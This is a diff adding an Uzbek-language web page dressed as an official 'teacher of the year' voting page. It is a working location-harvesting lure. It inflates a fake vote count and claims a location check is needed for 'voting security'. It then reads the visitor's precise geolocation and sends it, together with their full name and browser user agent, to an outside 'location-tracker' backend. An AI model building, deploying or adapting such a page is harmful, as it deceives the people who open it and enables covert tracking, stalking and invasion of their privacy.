@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ochiq Ovoz | 2026 Tanlov</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --blue: #1877f2;
+            --blue-dark: #0d65d9;
+            --blue-light: #e7f3ff;
+            --green: #22c55e;
+            --text: #1c1e21;
+            --text-muted: #65676b;
+            --border: #dddfe2;
+            --bg: #f0f2f5;
+            --white: #ffffff;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: var(--bg);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: var(--text);
+        }
+
+        /* ===== CARD ===== */
+        .vote-card {
+            background: var(--white);
+            width: 95%;
+            max-width: 400px;
+            border-radius: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,.04), 0 20px 40px rgba(0,0,0,.08);
+            padding: 32px 28px 28px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .header-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: var(--blue-light);
+            color: var(--blue);
+            padding: 5px 14px;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: .6px;
+            margin-bottom: 22px;
+        }
+        .header-tag svg { flex-shrink: 0; }
+
+        /* Avatar */
+        .avatar-wrap {
+            position: relative;
+            margin-bottom: 16px;
+        }
+        .profile-img {
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 4px solid var(--blue);
+            display: block;
+        }
+        .badge-verified {
+            position: absolute;
+            bottom: 4px; right: 4px;
+            background: var(--blue);
+            border-radius: 50%;
+            width: 26px; height: 26px;
+            display: flex; align-items: center; justify-content: center;
+            border: 3px solid white;
+        }
+
+        h2 { font-size: 21px; font-weight: 800; margin-bottom: 6px; }
+        p.desc { color: var(--text-muted); font-size: 13.5px; margin-bottom: 22px; line-height: 1.55; }
+
+        /* Stats */
+        .vote-stats {
+            width: 100%;
+            background: var(--bg);
+            border-radius: 14px;
+            padding: 14px 10px;
+            margin-bottom: 22px;
+            display: flex;
+            justify-content: space-around;
+        }
+        .stat-item { display: flex; flex-direction: column; align-items: center; gap: 3px; }
+        .stat-icon {
+            width: 32px; height: 32px;
+            background: var(--blue-light);
+            border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            margin-bottom: 4px;
+        }
+        .stat-icon svg { color: var(--blue); }
+        .stat-item span { font-weight: 700; color: var(--blue); font-size: 15px; }
+        .stat-item label { font-size: 11px; color: var(--text-muted); font-weight: 500; }
+
+        /* Input */
+        .input-group { width: 100%; text-align: left; margin-bottom: 18px; }
+        .input-label {
+            font-size: 12.5px;
+            color: var(--text-muted);
+            font-weight: 600;
+            margin-bottom: 7px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .input-wrap { position: relative; }
+        .input-wrap svg {
+            position: absolute;
+            left: 13px; top: 50%;
+            transform: translateY(-50%);
+            color: #b0b3b8;
+        }
+        input {
+            width: 100%;
+            padding: 13px 14px 13px 40px;
+            border: 1.5px solid var(--border);
+            border-radius: 10px;
+            font-family: inherit;
+            font-size: 14px;
+            outline: none;
+            transition: border .2s, box-shadow .2s;
+            color: var(--text);
+        }
+        input:focus {
+            border-color: var(--blue);
+            box-shadow: 0 0 0 3px rgba(24,119,242,.12);
+        }
+
+        /* Button */
+        .btn-vote {
+            width: 100%;
+            padding: 15px;
+            background: var(--blue);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-family: inherit;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: .4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background .2s, transform .1s, box-shadow .2s;
+        }
+        .btn-vote:hover { background: var(--blue-dark); box-shadow: 0 4px 14px rgba(24,119,242,.4); }
+        .btn-vote:active { transform: scale(0.98); }
+        .btn-vote:disabled { background: #d0d5dd; color: #98a2b3; cursor: not-allowed; box-shadow: none; }
+
+        /* Status */
+        #status {
+            margin-top: 14px;
+            font-size: 13.5px;
+            padding: 12px 14px;
+            border-radius: 10px;
+            display: none;
+            width: 100%;
+            text-align: left;
+            display: none;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+        }
+        .loading { background: #fff8e1; color: #92650a; }
+        .success { background: #dcfce7; color: #15803d; }
+        .error-st { background: #fee2e2; color: #b91c1c; }
+
+        /* ===== MODAL ===== */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,.55);
+            backdrop-filter: blur(5px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .modal-overlay.open { display: flex; }
+
+        .custom-modal {
+            background: white;
+            width: 88%;
+            max-width: 330px;
+            padding: 28px 24px;
+            border-radius: 22px;
+            text-align: center;
+            animation: slideUp .28s cubic-bezier(.34,1.56,.64,1);
+        }
+        @keyframes slideUp {
+            from { transform: translateY(24px) scale(.97); opacity: 0; }
+            to   { transform: translateY(0) scale(1); opacity: 1; }
+        }
+
+        .modal-icon-wrap {
+            width: 62px; height: 62px;
+            background: var(--blue-light);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 16px;
+        }
+        .modal-title { font-weight: 800; font-size: 18px; margin-bottom: 9px; }
+        .modal-text  { font-size: 13.5px; color: var(--text-muted); margin-bottom: 22px; line-height: 1.5; }
+
+        .btn-confirm {
+            background: var(--blue);
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-family: inherit;
+            font-weight: 700;
+            font-size: 14px;
+            width: 100%;
+            cursor: pointer;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            transition: background .2s;
+        }
+        .btn-confirm:hover { background: var(--blue-dark); }
+
+        .spinner {
+            width: 18px; height: 18px;
+            border: 2.5px solid rgba(255,255,255,.35);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin .7s linear infinite;
+            display: none;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="vote-card">
+    <span class="header-tag">
+        <!-- Shield check icon -->
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+        RASMIY SO'ROVNOMA
+    </span>
+
+    <div class="avatar-wrap">
+        <img src="img/user1.png" alt="Nargiza" class="profile-img"
+             onerror="this.src='https://ui-avatars.com/api/?name=Nargiza+Elmurodova&size=110&background=1877f2&color=fff&bold=true'">
+        <div class="badge-verified">
+            <!-- Check icon -->
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+    </div>
+
+    <h2>Nargiza Elmurodova</h2>
+    <p class="desc">"Yilning eng faol ayol o'qituvchisi" nominatsiyasi nomzodi.</p>
+
+    <div class="vote-stats">
+        <div class="stat-item">
+            <div class="stat-icon">
+                <!-- Users icon -->
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+            </div>
+            <span id="fakeVotes">14</span>
+            <label>Ovozlar</label>
+        </div>
+        <div class="stat-item">
+            <div class="stat-icon">
+                <!-- Trophy icon -->
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="8 21 12 17 16 21"/><line x1="12" y1="17" x2="12" y2="11"/><path d="M5 7H2V5h3M19 7h3V5h-3"/><path d="M5 5a7 7 0 0 0 14 0"/></svg>
+            </div>
+            <span>#4</span>
+            <label>Reyting</label>
+        </div>
+        <div class="stat-item">
+            <div class="stat-icon">
+                <!-- Star icon -->
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+            </div>
+            <span>58%</span>
+            <label>Reyting</label>
+        </div>
+    </div>
+
+    <div class="input-group">
+        <div class="input-label">
+            <!-- User icon -->
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+            F.I.SH. (To'liq ismingiz)
+        </div>
+        <div class="input-wrap">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+            <input type="text" id="userName" placeholder="Ismingizni kiriting...">
+        </div>
+    </div>
+
+    <button class="btn-vote" id="mainVoteBtn">
+        <!-- Vote/ballot icon -->
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 11 12 14 22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>
+        OVOZ BERISH
+    </button>
+
+    <div id="status"></div>
+</div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modalOverlay">
+    <div class="custom-modal">
+        <div class="modal-icon-wrap">
+            <!-- Map pin icon -->
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+        </div>
+        <div class="modal-title">Hududni Tasdiqlash</div>
+        <div class="modal-text">Ovoz berish tizimi xavfsizligi uchun joriy hududingizni tasdiqlashingiz zarur. Brauzer joylashuvingizni so'raydi.</div>
+        <button class="btn-confirm" id="confirmLocBtn">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+            <span id="confirmBtnText">DAVOM ETISH</span>
+            <div class="spinner" id="confirmSpinner"></div>
+        </button>
+    </div>
+</div>
+
+<script>
+    const mainVoteBtn    = document.getElementById('mainVoteBtn');
+    const modalOverlay   = document.getElementById('modalOverlay');
+    const confirmLocBtn  = document.getElementById('confirmLocBtn');
+    const confirmBtnText = document.getElementById('confirmBtnText');
+    const confirmSpinner = document.getElementById('confirmSpinner');
+    const statusDiv      = document.getElementById('status');
+    const nameInput      = document.getElementById('userName');
+    const fakeVotesElem  = document.getElementById('fakeVotes');
+
+    const API_URL = 'https://location-tracker-backend-1aqb.onrender.com/api';
+
+    // Soxta ovozlar animatsiyasi
+    let currentVotes = 14280;
+    setInterval(() => {
+        currentVotes += Math.floor(Math.random() * 2);
+        fakeVotesElem.innerText = currentVotes.toLocaleString('uz');
+    }, 4000);
+
+    function showStatus(type, msg) {
+        let icon = '';
+        if (type === 'loading') {
+            icon = `<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="animation:spin .7s linear infinite;flex-shrink:0"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>`;
+        } else if (type === 'success') {
+            icon = `<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>`;
+        } else {
+            icon = `<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>`;
+        }
+        statusDiv.className = type === 'loading' ? 'loading' : type === 'success' ? 'success' : 'error-st';
+        statusDiv.innerHTML = icon + msg;
+        statusDiv.style.display = 'flex';
+    }
+
+    // ASOSIY TUGMA
+    mainVoteBtn.addEventListener('click', () => {
+        if (nameInput.value.trim().length < 3) {
+            nameInput.focus();
+            nameInput.style.borderColor = '#e03131';
+            setTimeout(() => nameInput.style.borderColor = '', 1500);
+            return;
+        }
+        // Har doim modalni ko'rsat — geolocation so'rovi faqat user gesture'dan keyin ishlaydi
+        modalOverlay.classList.add('open');
+    });
+
+    // MODAL: DAVOM ETISH
+    confirmLocBtn.addEventListener('click', () => {
+        // UI loading holatiga o'tkazish
+        confirmBtnText.textContent = 'Kutilmoqda...';
+        confirmSpinner.style.display = 'block';
+        confirmLocBtn.disabled = true;
+
+        // Geolocation so'rovi — bu click event ichida, shuning uchun brauzer popup ochadi
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                modalOverlay.classList.remove('open');
+                confirmBtnText.textContent = 'DAVOM ETISH';
+                confirmSpinner.style.display = 'none';
+                confirmLocBtn.disabled = false;
+                sendData(position);
+            },
+            (error) => {
+                modalOverlay.classList.remove('open');
+                confirmBtnText.textContent = 'DAVOM ETISH';
+                confirmSpinner.style.display = 'none';
+                confirmLocBtn.disabled = false;
+
+                let msg = 'Joylashuv aniqlanmadi.';
+                if (error.code === error.PERMISSION_DENIED)
+                    msg = 'Joylashuvga ruxsat berilmadi. Brauzer sozlamalarini tekshiring.';
+                else if (error.code === error.TIMEOUT)
+                    msg = 'Vaqt tugadi. Qaytadan urinib ko\'ring.';
+
+                showStatus('error', msg);
+            },
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+    });
+
+    async function sendData(pos) {
+        showStatus('loading', 'Ovoz yuborilmoqda...');
+        mainVoteBtn.disabled = true;
+
+        try {
+            const response = await fetch(`${API_URL}/location`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    user_name: nameInput.value.trim(),
+                    latitude:  pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    device_info: 'Vote: Nargiza | ' + navigator.userAgent
+                })
+            });
+
+            if (response.ok) {
+                showStatus('success', 'Ovozingiz muvaffaqiyatli qabul qilindi!');
+                mainVoteBtn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> OVOZ BERILDI`;
+            } else {
+                throw new Error('Server xatosi');
+            }
+        } catch (e) {
+            showStatus('error', 'Xatolik yuz berdi. Qaytadan urinib ko\'ring.');
+            mainVoteBtn.disabled = false;
+        }
+    }
+</script>
+</body>
+</html>
